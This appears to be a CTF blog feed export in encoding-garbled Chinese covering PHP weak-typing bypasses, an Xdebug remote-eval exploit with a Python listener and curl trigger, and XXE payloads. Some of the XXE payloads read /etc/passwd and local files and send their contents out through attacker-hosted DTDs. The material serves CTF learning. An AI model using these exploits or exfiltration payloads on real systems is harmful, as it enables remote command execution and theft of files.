var_dump(intval([&apos;a&apos;]));        //1 ?&gt;</code></pre><p>åˆ©ç”¨intval()è¿›è¡Œè¿›åˆ¶è½¬æ¢(é»˜è®¤æ˜¯10è¿›åˆ¶)ç¢°åˆ°å¤´å¼€å§‹ç›´åˆ°é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ã€‚å³ä½¿å‡ºç°æ— æ³•è½¬æ¢çš„å­—ç¬¦ä¸²ä¹Ÿä¸ä¼šæŠ¥é”™è€Œæ˜¯è¿”å›0.ç¢°åˆ°ç©ºæ•°ç»„è¿”å›0ï¼Œéç©ºè¿”å›1.</p><p>å¯è¿”å›çš„æœ€å¤§å€¼å´å†³äºæ“ä½œç³»ç»Ÿï¼Œ32 ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ <code>integer</code> èŒƒå›´æ˜¯ <code>-2147483648</code> åˆ° <code>2147483647</code>ã€‚</p><pre><code>var_dump(intval(&apos;10000000000000000&apos;));   //int(2147483647)</code></pre><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h2><blockquote><p>strcmp â€” äºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²æ¯”è¾ƒ<br>å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼›å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</p></blockquote><pre><code>$password=$_GET[&apos;password&apos;];if(strcmp(&apos;am0s&apos;,$password)){    echo &apos;false!&apos;;}else{    echo &apos;success!&apos;;}</code></pre><p>æˆ‘ä»¬ä¼ å…¥<code>password[]=1</code>æ¥ç»•è¿‡ã€‚</p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>å½“æœ‰ä¸¤ä¸ª<code>is_numeric</code>åˆ¤æ–­å¹¶ç”¨<code>and</code>è¿æ¥æ—¶<code>and</code>åé¢çš„<code>is_numeric</code>å¯ä»¥ç»•è¿‡</p><blockquote><p>is_numeric â€” æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²<br>å¦‚æœ var æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE</p></blockquote><pre><code>var_dump(is_numeric(&apos; 45&apos;));   //bool(true)var_dump(is_numeric(&apos;45 &apos;));   //bool(false)</code></pre><p>å¿½ç•¥å‰é¢çš„ç©ºæ ¼ï¼Œä¸å¿½ç•¥åé¢çš„ç©ºæ ¼ã€‚</p><pre><code>$a=&apos; 1&apos;;$b=&apos;abc&apos;;$c=is_numeric($a) and is_numeric($b);var_dump(is_numeric($a));            //bool(true)var_dump(is_numeric($b));            //bool(false)var_dump($c);  //$bå¯ä»¥ä¸æ˜¯æ•°å­—ï¼ŒåŒæ ·è¿”å›truevar_dump(is_numeric(&apos;123E123&apos;));    //bool(true) å°å†™ä¹Ÿå¯ä»¥var_dump(is_numeric(&apos;+123e123&apos;));    //bool(true)    </code></pre><h2 id="ä¸falseæ¯”è¾ƒ"><a href="#ä¸falseæ¯”è¾ƒ" class="headerlink" title="ä¸falseæ¯”è¾ƒ"></a>ä¸falseæ¯”è¾ƒ</h2><pre><code>var_dump(null==false);        //bool(true)var_dump(0==false);            //bool(true)    var_dump(&apos;0&apos;==false);        //bool(true)$a[] = array(&apos; &apos; =&gt; &apos;&apos;,);var_dump($a[1] == false);        //bool(true)?&gt;</code></pre><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><blockquote><p>ereg â€” æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…<br>ä»¥åŒºåˆ†å¤§å°å†™çš„æ–¹å¼åœ¨ string ä¸­å¯»æ‰¾ä¸ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼ pattern æ‰€åŒ¹é…çš„å­ä¸²ã€‚ å¦‚æœæ‰¾åˆ°ä¸ pattern ä¸­åœ†æ‹¬å·å†…çš„å­æ¨¡å¼ç›¸åŒ¹é…çš„å­ä¸²å¹¶ä¸”å‡½æ•°è°ƒç”¨ç»™å‡ºäº†ç¬¬ä¸‰ä¸ªå‚æ•° regsï¼Œåˆ™åŒ¹é…é¡¹å°†è¢«å­˜å…¥ regs æ•°ç»„ä¸­ã€‚$regs[1] åŒ…å«ç¬¬ä¸€ä¸ªå·¦åœ†æ‹¬å·å¼€å§‹çš„å­ä¸²ï¼Œ$regs[2] åŒ…å«ç¬¬äºŒä¸ªå­ä¸²ï¼Œä»¥æ­¤ç±»æ¨ã€‚$regs[0] åŒ…å«æ•´ä¸ªåŒ¹é…çš„å­—ç¬¦ä¸²ã€‚ </p></blockquote><p>å­—ç¬¦ä¸²å¯¹æ¯”è§£æï¼Œeregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå½“eregè¯»å–å­—ç¬¦ä¸²stringæ—¶,å¦‚æœé‡åˆ°äº†%00,åé¢çš„å­—ç¬¦ä¸²å°±ä¸ä¼šè¢«è§£æã€‚</p><pre><code>$a = &quot;djasodja%0091&quot;;$b[] =  array(&apos;a&apos; =&gt; &apos;abcpd&apos;, );var_dump(ereg(&apos;([1-9])&apos;, $a));            //int(1)var_dump(ereg(&apos;pd&apos;, $b));                //NULL</code></pre><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><blockquote><p>switch è¯­å¥ç±»ä¼¼äºå…·æœ‰åŒä¸€ä¸ªè¡¨è¾¾å¼çš„ä¸€ç³»åˆ— if è¯­å¥ã€‚å¾ˆå¤šåœºåˆä¸‹éœ€è¦æŠŠåŒä¸€ä¸ªå˜é‡ï¼ˆæˆ–è¡¨è¾¾å¼ï¼‰ä¸å¾ˆå¤šä¸åŒçš„å€¼æ¯”è¾ƒï¼Œå¹¶æ ¹æ®å®ƒç­‰äºå“ªä¸ªå€¼æ¥æ‰§è¡Œä¸åŒçš„ä»£ç ã€‚è¿™æ­£æ˜¯ switch è¯­å¥çš„<br>ç”¨é€”.<br> æ³¨æ„å’Œå…¶å®ƒè¯­è¨€ä¸åŒï¼Œcontinue è¯­å¥ä½œç”¨åˆ° switch ä¸Šçš„ä½œç”¨ç±»ä¼¼äº breakã€‚å¦‚æœåœ¨å¾ªç¯ä¸­æœ‰ä¸€ä¸ª switch å¹¶å¸Œæœ› continue åˆ°å¤–å±‚å¾ªç¯ä¸­çš„ä¸‹ä¸€è½®å¾ªç¯ï¼Œç”¨ continue 2ã€‚<br> switch è¯­å¥ä¸€è¡Œæ¥ä¸€è¡Œåœ°æ‰§è¡Œï¼ˆå®é™…ä¸Šæ˜¯è¯­å¥æ¥è¯­å¥ï¼‰ã€‚å¼€å§‹æ—¶æ²¡æœ‰ä»£ç è¢«æ‰§è¡Œã€‚ä»…å½“ä¸€ä¸ª case è¯­å¥ä¸­çš„å€¼å’Œ switch è¡¨è¾¾å¼çš„å€¼åŒ¹é…æ—¶ PHP æ‰å¼€å§‹æ‰§è¡Œè¯­å¥ï¼Œç›´åˆ° switch çš„ç¨‹åºæ®µç»“æŸæˆ–è€…é‡åˆ°ç¬¬ä¸€ä¸ª break è¯­å¥ä¸ºæ­¢ã€‚å¦‚æœä¸åœ¨ case çš„è¯­å¥æ®µæœ€åå†™ä¸Š break çš„è¯ï¼ŒPHP å°†ç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ª case ä¸­çš„è¯­å¥æ®µ.</p></blockquote><pre><code>&lt;?phpswitch (true) {    //å¼±ç±»å‹    case 0:        echo &quot;0&quot;;        break;    case 1:        echo &quot;1&quot;;        break;    case 2:        echo &quot;2&quot;;        break;}//1?&gt;&lt;?phpswitch (0) {    case 0:        echo &quot;i equals 0&quot;;    case 1:        echo &quot;i equals 1&quot;;    case 2:        echo &quot;i equals 2&quot;;}//i equals 0    i equals 1    i equals 2?&gt; &lt;?phpswitch (&apos;a&apos;) {  // nullã€false    case 0:        echo &quot;0&quot;;        break;    case 1:        echo &quot;1&quot;;        break;    case 2:        echo &quot;2&quot;;        break;}//è¾“å‡º 0?&gt;</code></pre><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h2><blockquote><p>strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</p><p>int strpos( string $haystack, mixed $needle[, int $offset = 0] )<br>è¿”å› needle åœ¨ haystack ä¸­é¦–æ¬¡å‡ºç°çš„æ•°å­—ä½ç½®ã€‚</p><p>haystack<br>åœ¨è¯¥å­—ç¬¦ä¸²ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚ </p><p>needle<br>å¦‚æœ needle ä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå®ƒå°†è¢«è½¬æ¢ä¸ºæ•´å‹å¹¶è¢«è§†ä¸ºå­—ç¬¦çš„é¡ºåºå€¼ã€‚ </p><p>offset<br>å¦‚æœæä¾›äº†æ­¤å‚æ•°ï¼Œæœç´¢ä¼šä»å­—ç¬¦ä¸²è¯¥å­—ç¬¦æ•°çš„èµ·å§‹ä½ç½®å¼€å§‹ç»Ÿè®¡ã€‚å¦‚æœæ˜¯è´Ÿæ•°ï¼Œæœç´¢ä¼šä»å­—ç¬¦ä¸²ç»“å°¾æŒ‡å®šå­—ç¬¦æ•°å¼€å§‹ã€‚<br>è¿”å› needle å­˜åœ¨äº haystack å­—ç¬¦ä¸²èµ·å§‹çš„ä½ç½®(ç‹¬ç«‹äº offset)ã€‚åŒæ—¶æ³¨æ„å­—ç¬¦ä¸²ä½ç½®æ˜¯ä»0å¼€å§‹ï¼Œè€Œä¸æ˜¯ä»1å¼€å§‹çš„ã€‚<br>å¦‚æœæ²¡æ‰¾åˆ° needleï¼Œå°†è¿”å› FALSEã€‚ </p><p>7.1.0 å¼€å§‹æ”¯æŒè´Ÿæ•°çš„ offsetã€‚  </p></blockquote><p>å¤„ç†æ•°ç»„è¿”å›NULL</p><h2 id="array-search"><a href="#array-search" class="headerlink" title="array_search"></a>array_search</h2><blockquote><p>array_search â€” åœ¨æ•°ç»„ä¸­æœç´¢ç»™å®šçš„å€¼ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›é¦–ä¸ªç›¸åº”çš„é”®å</p><p>mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</p><p>å¤§æµ·æé’ˆï¼Œåœ¨å¤§æµ·ï¼ˆhaystackï¼‰ä¸­æœç´¢é’ˆï¼ˆ needle å‚æ•°ï¼‰ã€‚</p><p>needle<br>æœç´¢çš„å€¼ã€‚<br>Note:<br>å¦‚æœ needle æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™æ¯”è¾ƒä»¥åŒºåˆ†å¤§å°å†™çš„æ–¹å¼è¿›è¡Œã€‚</p><p>haystack<br>è¿™ä¸ªæ•°ç»„ã€‚ </p><p>strict<br>å¦‚æœå¯é€‰çš„ç¬¬ä¸‰ä¸ªå‚æ•° strict ä¸º TRUEï¼Œåˆ™ array_search() å°†åœ¨ haystack ä¸­æ£€æŸ¥å®Œå…¨ç›¸åŒçš„å…ƒç´ ã€‚è¿™æ„å‘³ç€åŒæ ·ä¸¥æ ¼æ¯”è¾ƒ haystack é‡Œ needle çš„ ç±»å‹ï¼Œå¹¶ä¸”å¯¹è±¡éœ€æ˜¯åŒä¸€ä¸ªå®ä¾‹ã€‚<br>å¦‚æœæ‰¾åˆ°äº† needle åˆ™è¿”å›å®ƒçš„é”®ï¼Œå¦åˆ™è¿”å› FALSEã€‚ </p><p>å¦‚æœ needle åœ¨ haystack ä¸­å‡ºç°ä¸æ­¢ä¸€æ¬¡ï¼Œåˆ™è¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…çš„é”®ã€‚è¦è¿”å›æ‰€æœ‰åŒ¹é…å€¼çš„é”®ï¼Œåº”è¯¥ç”¨ array_keys() åŠ ä¸Šå¯é€‰å‚æ•° search_value æ¥ä»£æ›¿ã€‚</p></blockquote><pre><code>&lt;?phpif(!is_array($_GET[&apos;test&apos;])){exit();}$test=$_GET[&apos;test&apos;];for($i=0;$i&lt;count($test);$i++){    if($test[$i]===&quot;admin&quot;){        echo &quot;error&quot;;        exit();    }    $test[$i]=intval($test[$i]);}if(array_search(&quot;admin&quot;,$test)===0){    echo &quot;flag&quot;;}else{    echo &quot;false&quot;;}?&gt;</code></pre><p>æˆ‘ä»¬ä½¿ç”¨<code>test[]=0</code>æ¥ç»•è¿‡ã€‚å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º<code>TRUE</code>ï¼Œè¿›è¡Œä¸¥æ ¼è¿‡æ»¤å°±ä¸èƒ½ç»•è¿‡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> å¼±ç±»å‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xdebug</title>
      <link href="/2019/08/17/Xdebug/"/>
      <url>/2019/08/17/Xdebug/</url>
      
        <content type="html"><![CDATA[<p>ä½ ä»æœªè§è¿‡çš„èˆ¹æ–°çŸ¥è¯†ç‚¹</p><a id="more"></a><h1 id="Xdebug"><a href="#Xdebug" class="headerlink" title="Xdebug"></a>Xdebug</h1><p>å¦‚ä½•ç¡®å®šå¼€å¯åŠ¨æ€è°ƒè¯•ï¼Ÿ</p><p>åœ¨vpsä¸Šç›‘å¬9000ç«¯å£  <code>nc -l -vv -p 9000</code></p><p>å†æ‰“å¼€ä¸€ä¸ªçª—å£æ‰§è¡Œ <code>curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39; -H &quot;X-Forwarded-For: VPS_IP&quot;</code></p><p>å¦‚æœæ­¤æ—¶ç›‘å¬çª—å£æ”¶åˆ°è¿”å›çš„xmlæ•°æ®åˆ™è¯æ˜å¼€å¯äº†åŠ¨æ€è°ƒè¯•ã€‚</p><h2 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨?"></a>å¦‚ä½•åˆ©ç”¨?</h2><p>Ricterzå¸ˆå‚…å†™å¥½äº†exp:</p><pre><code>#!/usr/bin/python2import socketip_port = (&apos;0.0.0.0&apos;,9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True:    client_data = conn.recv(1024)    print(client_data)    data = raw_input(&apos;&gt;&gt; &apos;)    conn.sendall(&apos;eval -i 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</code></pre><p>åœ¨vpsä¸Šæ‰§è¡Œè„šæœ¬ï¼Œç„¶åæ‰§è¡Œä¸Šæ–‡çš„curlä»£ç è§¦å‘Xdebugå³å¯ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>æˆ‘ä»¬é¦–å…ˆ<code>system(&#39;find /|grep flag&#39;)</code> æ‰¾ä¸€ä¸‹flagåœ¨å“ªï¼Œç„¶åè¯»å–</p><pre><code>system(&apos;cat /home/flag.txt&apos;)</code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="http://0sec.com.cn/2018-05-10/" target="_blank" rel="noopener">http://0sec.com.cn/2018-05-10/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xdebuf </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe</title>
      <link href="/2019/08/17/xxe/"/>
      <url>/2019/08/17/xxe/</url>
      
        <content type="html"><![CDATA[<p>ä¸€æ¬¡ç®€å•çš„xxeå­¦ä¹ ~</p><a id="more"></a><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="å®šä¹‰å®ä½“"><a href="#å®šä¹‰å®ä½“" class="headerlink" title="å®šä¹‰å®ä½“"></a>å®šä¹‰å®ä½“</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>å®šä¹‰ANYè¯´æ˜æ¥å—ä»»ä½•å…ƒç´ ï¼Œå®šä¹‰äº†äº†ä¸€ä¸ªXMLå®ä½“xxeï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡&amp;è¿›è¡Œå¼•ç”¨ã€‚XMLå¯ä»¥å†™æˆè¿™æ ·ï¼Œæˆ‘ä»¬è¾“å‡ºçš„ç»“æœä¸­xxeè¢«æ›¿æ¢æˆäº†test</p><pre><code>&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><h2 id="å®ä½“å¼•ç”¨"><a href="#å®ä½“å¼•ç”¨" class="headerlink" title="å®ä½“å¼•ç”¨"></a>å®ä½“å¼•ç”¨</h2><pre><code>&amp;lt;    &lt;    å°äºå·&amp;gt;    &gt;    å¤§äºå·&amp;amp;    &amp;    å’Œå·&amp;apos;    &apos;    å•å¼•å·&amp;quot;    &quot;    å¼•å· </code></pre><h2 id="DTD-document-type-definition-æ–‡æ¡£ç±»å‹å®šä¹‰"><a href="#DTD-document-type-definition-æ–‡æ¡£ç±»å‹å®šä¹‰" class="headerlink" title="DTD(document type definition æ–‡æ¡£ç±»å‹å®šä¹‰)"></a>DTD(document type definition æ–‡æ¡£ç±»å‹å®šä¹‰)</h2><p>è‡ªå®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå¯ä»¥åœ¨XMLå†…éƒ¨å£°æ˜ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p><p><code>SYSTEM</code> å¤–éƒ¨å¼•ç”¨æ–‡ä»¶<br>    <!DOCTYPE note SYSTEM "XXX.XX"></p><p>å†…éƒ¨å®ä½“å£°æ˜</p><pre><code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ELEMENT mail (message)&gt;&lt;!ENTITY hacker &quot;hacker&apos;s data&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>å¤–éƒ¨å®ä½“å£°æ˜</p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ELEMENT mail (message)&gt;&lt;!--ENTITY hacker &quot;hacker&apos;s data&quot;--&gt;&lt;!ENTITY hacker SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å¼•ç”¨å…¬ç”¨DTDï¼Œè¯­æ³•å¦‚ä¸‹</p><pre><code>&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt;</code></pre><p>èµ·å’ŒSYSTEMä¸€æ ·çš„ä½œç”¨</p><h2 id="å¤–éƒ¨å£°æ˜é»˜è®¤åè®®"><a href="#å¤–éƒ¨å£°æ˜é»˜è®¤åè®®" class="headerlink" title="å¤–éƒ¨å£°æ˜é»˜è®¤åè®®"></a>å¤–éƒ¨å£°æ˜é»˜è®¤åè®®</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt></p><h2 id="é€šç”¨å®ä½“ä¸å‚æ•°å®ä½“"><a href="#é€šç”¨å®ä½“ä¸å‚æ•°å®ä½“" class="headerlink" title="é€šç”¨å®ä½“ä¸å‚æ•°å®ä½“"></a>é€šç”¨å®ä½“ä¸å‚æ•°å®ä½“</h2><p>åªèƒ½ç”¨åœ¨DTDå’Œæ–‡æ¡£çš„å†…éƒ¨å­é›†ä¸­</p><p><strong>é€šç”¨å®ä½“</strong> <code>&amp;name;</code> åœ¨DTDä¸­å®šä¹‰ï¼Œåœ¨XMLä¸­å¼•ç”¨ï¼Œå¦‚ä¸Šæ–‡çš„ç¤ºä¾‹ä»£ç ã€‚</p><p><strong>å‚æ•°å®ä½“</strong></p><ol><li>ä½¿ç”¨ <code>% name</code> åœ¨DTDä¸­å®šä¹‰ï¼Œå¹¶ä¸”åªèƒ½åœ¨DTDä¸­ä½¿ç”¨<code>%name</code>å¼•ç”¨</li><li>åªæœ‰åœ¨DTDæ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“</li><li>å‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</li></ol><h2 id="æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶"><a href="#æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶"></a>æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶</h2><p>æœ¬åœ°æœåŠ¡å™¨è§£æä»£ç </p><pre><code>&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&apos;php://input&apos;);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);    echo $creds;?&gt;</code></pre><p>payload</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>æˆåŠŸè¯»å–åˆ°æ•æ„Ÿæ–‡ä»¶ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬çš„ç›®æ ‡æ–‡ä»¶åŒ…å«ç‰¹æ®Šç¬¦å·æ—¶XMLè§£é‡Šå™¨ä¼šç”Ÿæˆé”™è¯¯ï¼Œæˆ‘ä»¬è¿™æ ·åšå°±ä¼šæŠ¥é”™ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±ä½¿ç”¨ <code>&lt;![CDATA[</code>åœ¨å‚æ•°å®ä½“ä¸­è¿›è¡Œã€‚</p><p>payload</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p>evil.dtd</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>also,we can read the file just bs64-encode</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;     &lt;!DOCTYPE creds [      &lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt; ]&gt;     &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>è¿™æ ·å°±ç®—æœ‰ç‰¹æ®Šå­—ç¬¦ä¹Ÿä¸æ€•å•¦ï¼</p><h2 id="æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Blind-OOB-XXE"><a href="#æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Blind-OOB-XXE" class="headerlink" title="æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)"></a>æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)</h2><p>å¤–éƒ¨å®ä½“å¯ä»¥é€šè¿‡è¯·æ±‚å†…éƒ¨æ–‡ä»¶uriè·å¾—æ–‡ä»¶å†…å®¹ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡å†™ä¸¤ä¸ªå¤–éƒ¨å‚æ•°å®ä½“æ¥è¯·æ±‚è‡ªå·±çš„æœåŠ¡å™¨å°†æ–‡ä»¶å†…å®¹å‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Š</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt;     %send;]&gt;</code></pre><p>ä½†æ˜¯è¿™æ ·æ˜¯ä¸è¡Œçš„ï¼Œå‡ ä¹æ‰€æœ‰çš„XMLè§£æå™¨éƒ½ä¸ä¼šè§£æåŒçº§å‚æ•°å®ä½“çš„å†…å®¹ã€‚</p><p>å¦‚æœæˆ‘ä»¬è¿›è¡ŒåµŒå¥—æ“ä½œå‘¢ï¼Ÿ</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://myip/?%file;&apos;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>ä¼šæŠ¥é”™ <code>PEReferences forbidden in internal subset in Entity</code>ã€‚ç¦æ­¢åœ¨å†…éƒ¨å®ä½“å¼•ç”¨å‚æ•°å®ä½“ã€‚åŸºäºæ­¤æˆ‘ä»¬é‡‡ç”¨å¼•å…¥å¤–éƒ¨DTDï¼Œåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸ŠåŠ å…¥DTDæ–‡ä»¶</p><p>xml.php</p><pre><code>&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&apos;php://input&apos;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //loadXML() æ–¹æ³•é€šè¿‡è§£æä¸€ä¸ª XML æ ‡ç­¾å­—ç¬¦ä¸²æ¥ç»„æˆè¯¥æ–‡æ¡£ã€‚?&gt;</code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</code></pre><p>payload</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>åœ¨payloadçš„æœ€åæˆ‘ä»¬è¿ç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®ä½“<code>%remote;%int;%send;</code>ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é¡ºåºã€‚<code>%remote</code>å…ˆå‘Šè¯‰è§£é‡Šå™¨è¯·æ±‚è¿œç¨‹URLçš„<code>test.dtd</code>ï¼Œéšå<code>%int</code>è°ƒç”¨å‚æ•°å®ä½“ä¸­çš„<code>$file</code>ï¼Œè¿™å°†è¯·æ±‚test.txtçš„å†…å®¹å¹¶å°†å…¶ç¼–ç ï¼Œæœ€åè°ƒç”¨<code>%send</code>å°†æ•°æ®å‘é€åˆ°vpsä¸Šã€‚</p><h2 id="Exploiting-XXE-with-local-DTD-files"><a href="#Exploiting-XXE-with-local-DTD-files" class="headerlink" title="Exploiting XXE with local DTD files"></a>Exploiting XXE with local DTD files</h2><p>8/30/2019 10:47:36 AM </p><p>åœ¨Ogeak-ctfé‡Œç¢°ä¸Šä¸€é“xxeçš„é¢˜ï¼Œ<a href="http://47.107.253.140:18080/webserver/" title="é¢˜ç›®é“¾æ¥" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/</a></p><p>åœ¨æºç é‡Œæ‰¾åˆ°ä¸€æ®µå¥‡æ€ªçš„JS</p><pre><code>var data = &quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n&lt;request&gt;\n    &lt;status&gt;1&lt;/status&gt;\n&lt;/request&gt;&quot;;setInterval(function(){    $.post(&quot;callback&quot;, data);}, 10000);</code></pre><p>å½“æ—¶çœ‹ä¸æ‡‚è¿™æ˜¯å¹²å˜›çš„ï¼Œå› ä¸ºä¹Ÿæœ‰äº‹ä¹Ÿå°±æ²¡åšäº†ã€‚äº‹åå†çœ‹è¿™æ®µä»£ç 